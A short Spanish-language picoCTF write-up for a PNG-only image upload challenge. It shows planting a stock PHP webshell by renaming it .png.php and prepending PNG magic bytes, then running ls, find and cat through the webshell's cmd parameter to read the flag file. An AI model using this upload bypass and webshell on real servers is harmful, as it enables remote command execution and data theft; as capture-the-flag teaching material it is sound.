## Objetivo
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance¿´pñ.

## Solución
- Copiamos el archivo /usr/share/webshells/php/simple-backdoor.php a nuestra carpeta de picoCTF ahora llamado webshells.php
- Le editamos la extensión a .png.php para que la página lo reconozca como imagen
- Con nano le agregamos la palabra .PNG al principio del archivo
- Subimos ese archivo a la página
- http://atlas.picoctf.net:60912/uploads/webshell.png.php?cmd=ls para verificar que sirva el webshell
- http://atlas.picoctf.net:60912/uploads/webshell.png.php?cmd=find%20/%20-name%20*txt%202%3E/dev/null para encontrar los archivos txt
- http://atlas.picoctf.net:60912/uploads/webshell.png.php?cmd=cat%20/var/www/html/MQZWCYZWGI2WE.txt para leer el archivo que tiene la bandera 
![[Pasted image 20240930202109.png]]
## Notas adicionales
**Webshell** - Una webshell **es un código capaz de interpretar la información de un servidor web, que le permite a un atacante tomar el control de este**. En otras palabras, es una pequeña aplicación web que permite ejecutar tareas dentro del sitio comprometido, al igual que una terminal en un sistema operativo.
## Referencias
